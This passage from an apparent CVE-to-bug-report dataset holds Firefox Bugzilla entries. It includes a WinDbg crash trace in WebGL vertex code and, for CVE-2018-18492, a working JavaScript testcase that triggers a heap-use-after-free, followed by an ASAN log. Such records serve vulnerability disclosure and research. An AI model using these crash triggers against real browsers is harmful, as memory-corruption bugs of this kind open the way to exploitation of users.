[z:\\build\\build\\src\\dom\\canvas\\WebGLContextDraw.cpp @ 807] 0b 00000043`3dbfdc70 00007ffd`6906739d xul!mozilla::WebGLContext::DrawElements+0x62 [z:\\build\\build\\src\\dom\\canvas\\WebGLContext.h @ 1354] 0c 00000043`3dbfdcf0 00007ffd`669a491d xul!mozilla::dom::WebGLRenderingContext_Binding::drawElements+0xdd [z:\\build\\build\\src\\obj-firefox\\dom\\bindings\\WebGLRenderingContextBinding.cpp @ 15074] 0d 00000043`3dbfdd80 00007ffd`67b8773c xul!mozilla::dom::binding_detail::GenericMethod<mozilla::dom::binding_detail::NormalThisPolicy,mozilla::dom::binding_detail::ThrowExceptions>+0xfd [z:\\build\\build\\src\\dom\\bindings\\BindingUtils.cpp @ 3296] 0e 00000043`3dbfde40 00007ffd`67b87ffb xul!js::InternalCallOrConstruct+0x16c [z:\\build\\build\\src\\js\\src\\vm\\Interpreter.cpp @ 537] 0f 00000043`3dbfdf30 00007ffd`67b7c829 xul!InternalCall+0xbb [z:\\build\\build\\src\\js\\src\\vm\\Interpreter.cpp @ 588] 10 00000043`3dbfdf90 00007ffd`67b79ff1 xul!Interpret+0x2689 [z:\\build\\build\\src\\js\\src\\vm\\Interpreter.cpp @ 3267] 11 00000043`3dbfe370 00007ffd`67b88adc xul!js::RunScript+0x191 [z:\\build\\build\\src\\js\\src\\vm\\Interpreter.cpp @ 429] 12 00000043`3dbfe480 00007ffd`67b88c7a xul!js::ExecuteKernel+0xcc [z:\\build\\build\\src\\js\\src\\vm\\Interpreter.cpp @ 777] 13 00000043`3dbfe520 00007ffd`673b29f7 xul!js::Execute+0xca [z:\\build\\build\\src\\js\\src\\vm\\Interpreter.cpp @ 809] 14 00000043`3dbfe5a0 00007ffd`66cbf226 xul!ExecuteScript+0xc7 [z:\\build\\build\\src\\js\\src\\jsapi.cpp @ 4691] 15 00000043`3dbfe640 00007ffd`67010c7a xul!nsJSUtils::ExecutionContext::CompileAndExec+0x46 [z:\\build\\build\\src\\dom\\base\\nsJSUtils.cpp @ 254] 16 00000043`3dbfe680 00007ffd`6700e3d9 xul!mozilla::dom::ScriptLoader::ProcessRequest+0xcfa [z:\\build\\build\\src\\dom\\script\\ScriptLoader.cpp @ 2046] 17 00000043`3dbfe9c0 00007ffd`6700bd00 xul!mozilla::dom::ScriptLoader::ProcessScriptElement+0x1399 [z:\\build\\build\\src\\dom\\script\\ScriptLoader.cpp @ 1366] 18 00000043`3dbfedf0 00007ffd`6700cd63 xul!mozilla::dom::ScriptElement::MaybeProcessScript+0x1d0 [z:\\build\\build\\src\\dom\\script\\ScriptElement.cpp @ 141] 19 00000043`3dbfee70 00007ffd`66b98fde xul!nsHtml5TreeOpExecutor::RunScript+0xf3 [z:\\build\\build\\src\\parser\\html\\nsHtml5TreeOpExecutor.cpp @ 738] 1a 00000043`3dbfeed0 00007ffd`66b98afd xul!nsHtml5TreeOpExecutor::RunFlushLoop+0x4ce [z:\\build\\build\\src\\parser\\html\\nsHtml5TreeOpExecutor.cpp @ 540] 1b 00000043`3dbfefa0 00007ffd`67f2b9df xul!nsHtml5ExecutorFlusher::Run+0x1d [z:\\build\\build\\src\\parser\\html\\nsHtml5StreamParser.cpp @ 123] 1c 00000043`3dbfefd0 00007ffd`66921026 xul!mozilla::SchedulerGroup::Runnable::Run+0x2f [z:\\build\\build\\src\\xpcom\\threads\\SchedulerGroup.cpp @ 337] 1d 00000043`3dbff010 00007ffd`66920cc9 xul!nsThread::ProcessNextEvent+0x2c6 [z:\\build\\build\\src\\xpcom\\threads\\nsThread.cpp @ 1108] 1e 00000043`3dbff150 00007ffd`66af4b4b xul!NS_ProcessNextEvent+0x29 [z:\\build\\build\\src\\xpcom\\threads\\nsThreadUtils.cpp @ 519] 1f 00000043`3dbff1a0 00007ffd`66901078 xul!mozilla::ipc::MessagePump::Run+0xfb [z:\\build\\build\\src\\ipc\\glue\\MessagePump.cpp @ 97] 20 00000043`3dbff210 00007ffd`66920861 xul!MessageLoop::RunHandler+0x28 [z:\\build\\build\\src\\ipc\\chromium\\src\\base\\message_loop.cc @ 319] 21 00000043`3dbff260 00007ffd`66af4a28 xul!MessageLoop::Run+0x51 [z:\\build\\build\\src\\ipc\\chromium\\src\\base\\message_loop.cc @ 299] 22 00000043`3dbff2b0 00007ffd`66af4273 xul!nsBaseAppShell::Run+0x28 [z:\\build\\build\\src\\widget\\nsBaseAppShell.cpp @ 160] 23 00000043`3dbff2f0 00007ffd`6aad7f65 xul!nsAppShell::Run+0x23 [z:\\build\\build\\src\\widget\\windows\\nsAppShell.cpp @ 420] 24 00000043`3dbff320 00007ffd`66901078 xul!XRE_RunAppShell+0x45 [z:\\build\\build\\src\\toolkit\\xre\\nsEmbedFunctions.cpp @ 944] 25 00000043`3dbff360 00007ffd`66920861 xul!MessageLoop::RunHandler+0x28 [z:\\build\\build\\src\\ipc\\chromium\\src\\base\\message_loop.cc @ 319] 26 00000043`3dbff3b0 00007ffd`6aad7b71 xul!MessageLoop::Run+0x51 [z:\\build\\build\\src\\ipc\\chromium\\src\\base\\message_loop.cc @ 299] *** ERROR: Symbol file could not be found. Defaulted to export symbols for firefox.exe - 27 00000043`3dbff400 00007ff6`b6be14e5 xul!XRE_InitChildProcess+0x6d1 [z:\\build\\build\\src\\toolkit\\xre\\nsEmbedFunctions.cpp @ 774] 28 00000043`3dbff5f0 00007ff6`b6be143b firefox!Ordinal0+0x14e5 29 00000043`3dbff650 00007ff6`b6be1106 firefox!Ordinal0+0x143b 2a 00000043`3dbff6d0 00007ff6`b6c1c824 firefox!Ordinal0+0x1106 *** ERROR: Symbol file could not be found. Defaulted to export symbols for C:\\WINDOWS\\System32\\KERNEL32.DLL - 2b 00000043`3dbff730 00007ffd`cb2a7e94 firefox!TargetNtUnmapViewOfSection+0x9294 *** ERROR: Symbol file could not be found. Defaulted to export symbols for ntdll.dll - 2c 00000043`3dbff770 00007ffd`cbf57ad1 KERNEL32!BaseThreadInitThunk+0x14 2d 00000043`3dbff7a0 00000000`00000000 ntdll!RtlUserThreadStart+0x21 6:251> dx Debugger.Sessions[0].Processes[23304].Threads[20040].Stack.Frames[1].SwitchTo();dv /t /v Debugger.Sessions[0].Processes[23304].Threads[20040].Stack.Frames[1].SwitchTo() <unavailable> class rx::VertexBuffer11 * this = <value unavailable> @rbx struct gl::VertexAttribute * attrib = 0x000001a7`01436400 <unavailable> class gl::VertexBinding * binding = <value unavailable> 00000043`3dbfd040 unsigned int currentValueType = 0x1406 00000043`3dbfd048 int start = 0n-654114815 00000043`3dbfd050 unsigned int64 count = 1 00000043`3dbfd058 int instances = 0n0 00000043`3dbfd060 unsigned int offset = 0 00000043`3dbfd068 unsigned char * sourceData = 0x000001a7`014a8500 \"\" @r12 unsigned char * input = 0x000001a6`b3508502 \"--- memory read error at address 0x000001a6`b3508502 ---\" @rsi unsigned char * output = 0x000001a7`77880000 \"\" <unavailable> int inputStride = <value unavailable> <unavailable> gl::VertexFormatType vertexFormatType = <value unavailable> <unavailable> D3D_FEATURE_LEVEL featureLevel = <value unavailable> <unavailable> struct rx::d3d11::VertexFormat * vertexFormatInfo = <value unavailable> <unavailable> class gl::Error ANGLE_LOCAL_VAR = <value unavailable> 6:251> dx -id 0,6 -r1 ((libGLESv2!unsigned char *)0x1a6b3508502) ((libGLESv2!unsigned char *)0x1a6b3508502) : 0x1a6b3508502 : Unable to read memory at Address 0x1a6b3508502 [Type: unsigned char *] Unable to read memory at Address 0x1a6b3508502 https://dxr.mozilla.org/mozilla-central/source/gfx/angle/checkout/src/libANGLE/renderer/d3d/d3d11/VertexBuffer11.cpp#128 angle::Result VertexBuffer11::storeVertexAttributes(const gl::Context *context, const gl::VertexAttribute &attrib, const gl::VertexBinding &binding, GLenum currentValueType, GLint start, size_t count, GLsizei instances, unsigned int offset, const uint8_t *sourceData) { ASSERT(mBuffer.valid()); int inputStride = static_cast<int>(ComputeVertexAttributeStride(attrib, binding)); // This will map the resource if it isn't already mapped. ANGLE_TRY(mapResource(context)); uint8_t *output = mMappedResourceData + offset; const uint8_t *input = sourceData; if (instances == 0 || binding.getDivisor() == 0) { input += inputStride * start; } gl::VertexFormatType vertexFormatType = gl::GetVertexFormatType(attrib, currentValueType); const D3D_FEATURE_LEVEL featureLevel = mRenderer->getRenderer11DeviceCaps().featureLevel; const d3d11::VertexFormat &vertexFormatInfo = d3d11::GetVertexFormatInfo(vertexFormatType, featureLevel); ASSERT(vertexFormatInfo.copyFunction != nullptr); vertexFormatInfo.copyFunction(input, inputStride, count, output); return angle::Result::Continue(); } 6:251> lmv m firefox Browse full module list start end module name 00007ff6`b6be0000 00007ff6`b6c62000 firefox (deferred) Image path: firefox.exe Image name: firefox.exe Browse all global symbols functions data Timestamp: Thu Oct 18 12:36:32 2018 (5BC8E0C0) CheckSum: 000857C7 ImageSize: 00082000 File version: 63.0.0.6865 Product version: 63.0.0.0 File flags: 0 (Mask 3F) File OS: 4 Unknown Win32 File type: 2.0 Dll File date: 00000000.00000000 Translations: 0000.04b0 Information from resource tables: CompanyName: Mozilla Corporation ProductName: Firefox InternalName: Firefox OriginalFilename: firefox.exe ProductVersion: 63.0 FileVersion: 63.0 FileDescription: Firefox LegalCopyright: ©Firefox and Mozilla Developers; available under the MPL 2 license. LegalTrademarks: Firefox is a Trademark of The Mozilla Foundation. Attached is the POC that was sent as well."
      }
    ],
    "CVE-2018-18492": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1499861",
        "title": "heap-use-after-free in mozilla::dom::HTMLOptionsCollection_Binding::add",
        "description": "The following testcase crashes the lates ASAN build of Firefox 64.0a1 (BuildID=20181017165417). It requires a fuzzing build (--enable-fuzzing) and the pref fuzzing.enabled=true. <script> function start() { o260=document.createElementNS('http://www.w3.org/1999/xhtml','select'); o261=document.createElementNS('http://www.w3.org/1999/xhtml','optgroup'); o577=o260.options; o651=document.createElementNS('http://www.w3.org/1999/xhtml','optgroup'); o261.appendChild(o651); o261.addEventListener('DOMNodeRemoved',fun0); o995=o577.add(o651); } function fun0() { o260=null;o261=null;o651=null; FuzzingFunctions.garbageCollect();FuzzingFunctions.cycleCollect();FuzzingFunctions.garbageCollect();FuzzingFunctions.cycleCollect(); } </script> <body onload=\"start()\"></body> ASAN output: ================================================================= ==15482==ERROR: AddressSanitizer: heap-use-after-free on address 0x6120000aef68 at pc 0x7f73eef09f74 bp 0x7ffe1de27650 sp 0x7ffe1de27648 READ of size 8 at 0x6120000aef68 thread T0 (file:// Content) #0 0x7f73eef09f73 in GetParentNode /builds/worker/workspace/build/src/dom/base/nsINode.h:953:12 #1 0x7f73eef09f73 in IsDocument /builds/worker/workspace/build/src/dom/base/nsINode.h:418 #2 0x7f73eef09f73 in IsAllowedAsChild(nsIContent*, nsINode*, bool, nsINode*) /builds/worker/workspace/build/src/dom/base/nsINode.cpp:2092 #3 0x7f73eef0a58a in EnsurePreInsertionValidity2 /builds/worker/workspace/build/src/dom/base/nsINode.cpp:2241:8 #4 0x7f73eef0a58a in nsINode::ReplaceOrInsertBefore(bool, nsINode*, nsINode*, mozilla::ErrorResult&) /builds/worker/workspace/build/src/dom/base/nsINode.cpp:2307 #5 0x7f73f1ae800e in mozilla::dom::HTMLOptionsCollection_Binding::add(JSContext*, JS::Handle<JSObject*>, mozilla::dom::HTMLOptionsCollection*, JSJitMethodCallArgs const&) /builds/worker/workspace/build/src/obj-firefox/dom/bindings/HTMLOptionsCollectionBinding.cpp:170:9 #6 0x7f73f1e4f270 in bool mozilla::dom::binding_detail::GenericMethod<mozilla::dom::binding_detail::NormalThisPolicy, mozilla::dom::binding_detail::ThrowExceptions>(JSContext*, unsigned int, JS::Value*) /builds/worker/workspace/build/src/dom/bindings/BindingUtils.cpp:3315:13 #7 0x7f73fac5f60b in CallJSNative /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:468:15 #8 0x7f73fac5f60b in js::InternalCallOrConstruct(JSContext*, JS::CallArgs const&, js::MaybeConstruct) /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:560 #9 0x7f73fac4858e in CallFromStack /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:620:12 #10 0x7f73fac4858e in Interpret(JSContext*, js::RunState&) /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:3458 #11 0x7f73fac2d85b in js::RunScript(JSContext*, js::RunState&) /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:447:12 #12 0x7f73fac6011e in js::InternalCallOrConstruct(JSContext*, JS::CallArgs const&, js::MaybeConstruct) /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:587:15 #13 0x7f73fac61eb2 in js::Call(JSContext*, JS::Handle<JS::Value>, JS::Handle<JS::Value>, js::AnyInvokeArgs const&, JS::MutableHandle<JS::Value>) /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:633:10 #14 0x7f73f9d3550d in JS::Call(JSContext*, JS::Handle<JS::Value>, JS::Handle<JS::Value>, JS::HandleValueArray const&, JS::MutableHandle<JS::Value>) /builds/worker/workspace/build/src/js/src/jsapi.cpp:2979:12 #15 0x7f73f13e8efa in mozilla::dom::EventHandlerNonNull::Call(JSContext*, JS::Handle<JS::Value>, mozilla::dom::Event&, JS::MutableHandle<JS::Value>, mozilla::ErrorResult&) /builds/worker/workspace/build/src/obj-firefox/dom/bindings/EventHandlerBinding.cpp:265:37 #16 0x7f73f26eae4a in void mozilla::dom::EventHandlerNonNull::Call<nsISupports*>(nsISupports* const&, mozilla::dom::Event&, JS::MutableHandle<JS::Value>, mozilla::ErrorResult&, char const*, mozilla::dom::CallbackObject::ExceptionHandling, JS::Realm*) /builds/worker/workspace/build/src/obj-firefox/dist/include/mozilla/dom/EventHandlerBinding.h:363:12 #17 0x7f73f26e82ce in mozilla::JSEventHandler::HandleEvent(mozilla::dom::Event*) /builds/worker/workspace/build/src/dom/events/JSEventHandler.cpp:214:12 #18 0x7f73f269d445 in mozilla::EventListenerManager::HandleEventSubType(mozilla::EventListenerManager::Listener*, mozilla::dom::Event*, mozilla::dom::EventTarget*) /builds/worker/workspace/build/src/dom/events/EventListenerManager.cpp:1106:52 #19 0x7f73f269f40c in mozilla::EventListenerManager::HandleEventInternal(nsPresContext*, mozilla::WidgetEvent*, mozilla::dom::Event**, mozilla::dom::EventTarget*, nsEventStatus*, bool) /builds/worker/workspace/build/src/dom/events/EventListenerManager.cpp:1308:15 #20 0x7f73f268226e in HandleEvent /builds/worker/workspace/build/src/obj-firefox/dist/include/mozilla/EventListenerManager.h:390:5 #21 0x7f73f268226e in mozilla::EventTargetChainItem::HandleEvent(mozilla::EventChainPostVisitor&, mozilla::ELMCreationDetector&) /builds/worker/workspace/build/src/dom/events/EventDispatcher.cpp:424 #22 0x7f73f2680513 in mozilla::EventTargetChainItem::HandleEventTargetChain(nsTArray<mozilla::EventTargetChainItem>&, mozilla::EventChainPostVisitor&, mozilla::EventDispatchingCallback*, mozilla::ELMCreationDetector&) /builds/worker/workspace/build/src/dom/events/EventDispatcher.cpp:641:16 #23 0x7f73f2686fe8 in mozilla::EventDispatcher::Dispatch(nsISupports*, nsPresContext*, mozilla::WidgetEvent*, mozilla::dom::Event*, nsEventStatus*, mozilla::EventDispatchingCallback*, nsTArray<mozilla::dom::EventTarget*>*) /builds/worker/workspace/build/src/dom/events/EventDispatcher.cpp:1156:11 #24 0x7f73f5316c06 in nsDocumentViewer::LoadComplete(nsresult) /builds/worker/workspace/build/src/layout/base/nsDocumentViewer.cpp:1167:7 #25 0x7f73f81afe24 in nsDocShell::EndPageLoad(nsIWebProgress*, nsIChannel*, nsresult) /builds/worker/workspace/build/src/docshell/base/nsDocShell.cpp:7151:21 #26 0x7f73f81aae97 in nsDocShell::OnStateChange(nsIWebProgress*, nsIRequest*, unsigned int, nsresult) /builds/worker/workspace/build/src/docshell/base/nsDocShell.cpp:6942:7 #27 0x7f73f81b4327 in non-virtual thunk to nsDocShell::OnStateChange(nsIWebProgress*, nsIRequest*, unsigned int, nsresult) /builds/worker/workspace/build/src/docshell/base/nsDocShell.cpp #28 0x7f73ed4da465 in nsDocLoader::DoFireOnStateChange(nsIWebProgress*, nsIRequest*, int&, nsresult) /builds/worker/workspace/build/src/uriloader/base/nsDocLoader.cpp:1307:3 #29 0x7f73ed4d904c in nsDocLoader::doStopDocumentLoad(nsIRequest*, nsresult) /builds/worker/workspace/build/src/uriloader/base/nsDocLoader.cpp:850:14 #30 0x7f73ed4d4b39 in nsDocLoader::DocLoaderIsEmpty(bool) /builds/worker/workspace/build/src/uriloader/base/nsDocLoader.cpp:739:9 #31 0x7f73ed4d7412 in nsDocLoader::OnStopRequest(nsIRequest*, nsISupports*, nsresult) /builds/worker/workspace/build/src/uriloader/base/nsDocLoader.cpp:628:5 #32 0x7f73ed4d8b74 in non-virtual thunk to nsDocLoader::OnStopRequest(nsIRequest*, nsISupports*, nsresult) /builds/worker/workspace/build/src/uriloader/base/nsDocLoader.cpp #33 0x7f73eaf164d2 in mozilla::net::nsLoadGroup::RemoveRequest(nsIRequest*, nsISupports*, nsresult) /builds/worker/workspace/build/src/netwerk/base/nsLoadGroup.cpp:629:28 #34 0x7f73eee27de7 in DoUnblockOnload /builds/worker/workspace/build/src/dom/base/nsDocument.cpp:8351:18 #35 0x7f73eee27de7 in nsDocument::UnblockOnload(bool) /builds/worker/workspace/build/src/dom/base/nsDocument.cpp:8273 #36 0x7f73eee031fc in nsIDocument::DispatchContentLoadedEvents() /builds/worker/workspace/build/src/dom/base/nsDocument.cpp:5297:3 #37 0x7f73eef6939b in applyImpl<nsIDocument, void (nsIDocument::*)()> /builds/worker/workspace/build/src/obj-firefox/dist/include/nsThreadUtils.h:1191:12 #38 0x7f73eef6939b in apply<nsIDocument, void (nsIDocument::*)()> /builds/worker/workspace/build/src/obj-firefox/dist/include/nsThreadUtils.h:1197 #39 0x7f73eef6939b in mozilla::detail::RunnableMethodImpl<nsIDocument*, void (nsIDocument::*)(), true, (mozilla::RunnableKind)0>::Run() /builds/worker/workspace/build/src/obj-firefox/dist/include/nsThreadUtils.h:1242 #40 0x7f73eac56be5 in mozilla::SchedulerGroup::Runnable::Run() /builds/worker/workspace/build/src/xpcom/threads/SchedulerGroup.cpp:337:32 #41 0x7f73eac93c06 in nsThread::ProcessNextEvent(bool, bool*) /builds/worker/workspace/build/src/xpcom/threads/nsThread.cpp:1252:14 #42 0x7f73eac9c72d in NS_ProcessNextEvent(nsIThread*, bool) /builds/worker/workspace/build/src/xpcom/threads/nsThreadUtils.cpp:530:10 #43 0x7f73ebeb3df3 in mozilla::ipc::MessagePump::Run(base::MessagePump::Delegate*) /builds/worker/workspace/build/src/ipc/glue/MessagePump.cpp:97:21 #44 0x7f73ebdb69dc in RunInternal /builds/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:325:10 #45 0x7f73ebdb69dc in RunHandler /builds/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:318 #46 0x7f73ebdb69dc in MessageLoop::Run() /builds/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:298 #47 0x7f73f4ab7573 in nsBaseAppShell::Run() /builds/worker/workspace/build/src/widget/nsBaseAppShell.cpp:158:27 #48 0x7f73f8f75a6e in XRE_RunAppShell() /builds/worker/workspace/build/src/toolkit/xre/nsEmbedFunctions.cpp:939:22 #49 0x7f73ebdb69dc in RunInternal /builds/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:325:10 #50 0x7f73ebdb69dc in RunHandler /builds/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:318 #51 0x7f73ebdb69dc in MessageLoop::Run() /builds/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:298 #52 0x7f73f8f74b13 in XRE_InitChildProcess(int, char**, XREChildData const*) /builds/worker/workspace/build/src/toolkit/xre/nsEmbedFunctions.cpp:765:34 #53 0x55a4bad84b91 in content_process_main /builds/worker/workspace/build/src/browser/app/../../ipc/contentproc/plugin-container.cpp:50:30 #54 0x55a4bad84b91 in main /builds/worker/workspace/build/src/browser/app/nsBrowserApp.cpp:287 #55 0x7f740ced1b96 in __libc_start_main (/lib/x86_64-linux-gnu/libc.so.6+0x21b96) #56 0x55a4bacb3f3c in _start (/home/nils/fuzzer3/firefox/firefox+0x2cf3c) 0x6120000aef68 is located 40 bytes inside of 288-byte region [0x6120000aef40,0x6120000af060) freed by thread T0 (file:// Content) here: #0 0x55a4bad54372 in __interceptor_free /builds/worker/workspace/moz-toolchain/src/llvm/projects/compiler-rt/lib/asan/asan_malloc_linux.cc:68:3 #1 0x7f73eaa98d51 in SnowWhiteKiller::~SnowWhiteKiller() /builds/worker/workspace/build/src/xpcom/base/nsCycleCollector.cpp:2740:7 #2 0x7f73eaa97500 in nsCycleCollector::FreeSnowWhite(bool) /builds/worker/workspace/build/src/xpcom/base/nsCycleCollector.cpp:2963:3 #3 0x7f73eaaa39af in nsCycleCollector::BeginCollection(ccType, nsICycleCollectorListener*) /builds/worker/workspace/build/src/xpcom/base/nsCycleCollector.cpp:3996:3 #4 0x7f73eaaa2c84 in nsCycleCollector::Collect(ccType, js::SliceBudget&, nsICycleCollectorListener*, bool) /builds/worker/workspace/build/src/xpcom/base/nsCycleCollector.cpp:3817:9 #5 0x7f73eaaa7c13 in nsCycleCollector_collect(nsICycleCollectorListener*) /builds/worker/workspace/build/src/xpcom/base/nsCycleCollector.cpp:4408:21 #6 0x7f73eef234ee in nsJSContext::CycleCollectNow(nsICycleCollectorListener*) /builds/worker/workspace/build/src/dom/base/nsJSEnvironment.cpp:1526:3 #7 0x7f73f1703d41 in mozilla::dom::FuzzingFunctions_Binding::cycleCollect(JSContext*, unsigned int, JS::Value*) /builds/worker/workspace/build/src/obj-firefox/dom/bindings/FuzzingFunctionsBinding.cpp:60:3 #8 0x7f73fac5f60b in CallJSNative /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:468:15 #9 0x7f73fac5f60b in js::InternalCallOrConstruct(JSContext*, JS::CallArgs const&, js::MaybeConstruct) /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:560 #10 0x7f73fac4858e in CallFromStack /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:620:12 #11 0x7f73fac4858e in Interpret(JSContext*, js::RunState&) /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:3458 #12 0x7f73fac2d85b in js::RunScript(JSContext*, js::RunState&) /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:447:12 #13 0x7f73fac6011e in js::InternalCallOrConstruct(JSContext*, JS::CallArgs const&, js::MaybeConstruct) /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:587:15 #14 0x7f73fac61eb2 in js::Call(JSContext*, JS::Handle<JS::Value>, JS::Handle<JS::Value>, js::AnyInvokeArgs const&, JS::MutableHandle<JS::Value>) /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:633:10 #15 0x7f73f9d3550d in JS::Call(JSContext*, JS::Handle<JS::Value>, JS::Handle<JS::Value>, JS::HandleValueArray const&, JS::MutableHandle<JS::Value>) /builds/worker/workspace/build/src/js/src/jsapi.cpp:2979:12 #16 0x7f73f13eee9e in mozilla::dom::EventListener::HandleEvent(JSContext*, JS::Handle<JS::Value>, mozilla::dom::Event&, mozilla::ErrorResult&) /builds/worker/workspace/build/src/obj-firefox/dom/bindings/EventListenerBinding.cpp:52:8 #17 0x7f73f269d3ec in HandleEvent<mozilla::dom::EventTarget *> /builds/worker/workspace/build/src/obj-firefox/dist/include/mozilla/dom/EventListenerBinding.h:66:12 #18 0x7f73f269d3ec in mozilla::EventListenerManager::HandleEventSubType(mozilla::EventListenerManager::Listener*, mozilla::dom::Event*, mozilla::dom::EventTarget*) /builds/worker/workspace/build/src/dom/events/EventListenerManager.cpp:1103 #19 0x7f73f269f40c in mozilla::EventListenerManager::HandleEventInternal(nsPresContext*, mozilla::WidgetEvent*, mozilla::dom::Event**, mozilla::dom::EventTarget*, nsEventStatus*, bool) /builds/worker/workspace/build/src/dom/events/EventListenerManager.cpp:1308:15 #20 0x7f73f268226e in HandleEvent /builds/worker/workspace/build/src/obj-firefox/dist/include/mozilla/EventListenerManager.h:390:5 #21 0x7f73f268226e in mozilla::EventTargetChainItem::HandleEvent(mozilla::EventChainPostVisitor&, mozilla::ELMCreationDetector&) /builds/worker/workspace/build/src/dom/events/EventDispatcher.cpp:424 #22 0x7f73f2680a14 in mozilla::EventTargetChainItem::HandleEventTargetChain(nsTArray<mozilla::EventTargetChainItem>&, mozilla::EventChainPostVisitor&, mozilla::EventDispatchingCallback*, mozilla::ELMCreationDetector&) /builds/worker/workspace/build/src/dom/events/EventDispatcher.cpp:677:14 #23 0x7f73f2686fe8 in mozilla::EventDispatcher::Dispatch(nsISupports*, nsPresContext*, mozilla::WidgetEvent*, mozilla::dom::Event*, nsEventStatus*, mozilla::EventDispatchingCallback*, nsTArray<mozilla::dom::EventTarget*>*) /builds/worker/workspace/build/src/dom/events/EventDispatcher.cpp:1156:11 #24 0x7f73ee8f0170 in nsContentUtils::MaybeFireNodeRemoved(nsINode*, nsINode*) /builds/worker/workspace/build/src/dom/base/nsContentUtils.cpp:4759:5 #25 0x7f73eef0a49c in nsINode::ReplaceOrInsertBefore(bool, nsINode*, nsINode*, mozilla::ErrorResult&) /builds/worker/workspace/build/src/dom/base/nsINode.cpp:2292:7 #26 0x7f73f1ae800e in mozilla::dom::HTMLOptionsCollection_Binding::add(JSContext*, JS::Handle<JSObject*>, mozilla::dom::HTMLOptionsCollection*, JSJitMethodCallArgs const&) /builds/worker/workspace/build/src/obj-firefox/dom/bindings/HTMLOptionsCollectionBinding.cpp:170:9 #27 0x7f73f1e4f270 in bool mozilla::dom::binding_detail::GenericMethod<mozilla::dom::binding_detail::NormalThisPolicy, mozilla::dom::binding_detail::ThrowExceptions>(JSContext*, unsigned int, JS::Value*) /builds/worker/workspace/build/src/dom/bindings/BindingUtils.cpp:3315:13 #28 0x7f73fac5f60b in CallJSNative /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:468:15 #29 0x7f73fac5f60b in js::InternalCallOrConstruct(JSContext*, JS::CallArgs const&, js::MaybeConstruct) /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:560 #30 0x7f73fac4858e in CallFromStack /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:620:12 #31 0x7f73fac4858e in Interpret(JSContext*, js::RunState&) /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:3458 #32 0x7f73fac2d85b in js::RunScript(JSContext*, js::RunState&) /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:447:12 #33 0x7f73fac6011e in js::InternalCallOrConstruct(JSContext*, JS::CallArgs const&, js::MaybeConstruct) /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:587:15 #34 0x7f73fac61eb2 in js::Call(JSContext*, JS::Handle<JS::Value>, JS::Handle<JS::Value>, js::AnyInvokeArgs const&, JS::MutableHandle<JS::Value>) /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:633:10 #35 0x7f73f9d3550d in JS::Call(JSContext*, JS::Handle<JS::Value>, JS::Handle<JS::Value>, JS::HandleValueArray const&, JS::MutableHandle<JS::Value>) /builds/worker/workspace/build/src/js/src/jsapi.cpp:2979:12 previously allocated by thread T0 (file:// Content) here: #0 0x55a4bad546b3 in malloc /builds/worker/workspace/moz-toolchain/src/llvm/projects/compiler-rt/lib/asan/asan_malloc_linux.cc:88:3 #1 0x55a4bad85acd in moz_xmalloc /builds/worker/workspace/build/src/memory/mozalloc/mozalloc.cpp:70:17 #2 0x7f73f2adc8e1 in operator new /builds/worker/workspace/build/src/obj-firefox/dist/include/mozilla/mozalloc.h:139:12 #3 0x7f73f2adc8e1 in NS_NewHTMLSelectElement(already_AddRefed<mozilla::dom::NodeInfo>&&, mozilla::dom::FromParser) /builds/worker/workspace/build/src/dom/html/HTMLSelectElement.cpp:40 #4 0x7f73f2b94c17 in CreateHTMLElement(unsigned int, already_AddRefed<mozilla::dom::NodeInfo>&&, mozilla::dom::FromParser) /builds/worker/workspace/build/src/dom/html/nsHTMLContentSink.cpp:255:41 #5 0x7f73ee9308d9 in nsContentUtils::NewXULOrHTMLElement(mozilla::dom::Element**, mozilla::dom::NodeInfo*, mozilla::dom::FromParser, nsAtom*, mozilla::dom::CustomElementDefinition*) /builds/worker/workspace/build/src/dom/base/nsContentUtils.cpp:10153:18 #6 0x7f73f2b94aeb in NS_NewHTMLElement(mozilla::dom::Element**, already_AddRefed<mozilla::dom::NodeInfo>&&, mozilla::dom::FromParser, nsAtom*, mozilla::dom::CustomElementDefinition*) /builds/worker/workspace/build/src/dom/html/nsHTMLContentSink.cpp:238:10 #7 0x7f73eef7fd0c in NS_NewElement(mozilla::dom::Element**, already_AddRefed<mozilla::dom::NodeInfo>&&, mozilla::dom::FromParser, nsTSubstring<char16_t> const*) /builds/worker/workspace/build/src/dom/base/nsNameSpaceManager.cpp:192:12 #8 0x7f73eee0b045 in nsIDocument::CreateElementNS(nsTSubstring<char16_t> const&, nsTSubstring<char16_t> const&, mozilla::dom::ElementCreationOptionsOrString const&, mozilla::ErrorResult&) /builds/worker/workspace/build/src/dom/base/nsDocument.cpp:5796:8 #9 0x7f73f1453148 in mozilla::dom::Document_Binding::createElementNS(JSContext*, JS::Handle<JSObject*>, nsIDocument*, JSJitMethodCallArgs const&) /builds/worker/workspace/build/src/obj-firefox/dom/bindings/DocumentBinding.cpp:1360:59 #10 0x7f73f1e4f270 in bool mozilla::dom::binding_detail::GenericMethod<mozilla::dom::binding_detail::NormalThisPolicy, mozilla::dom::binding_detail::ThrowExceptions>(JSContext*, unsigned int, JS::Value*) 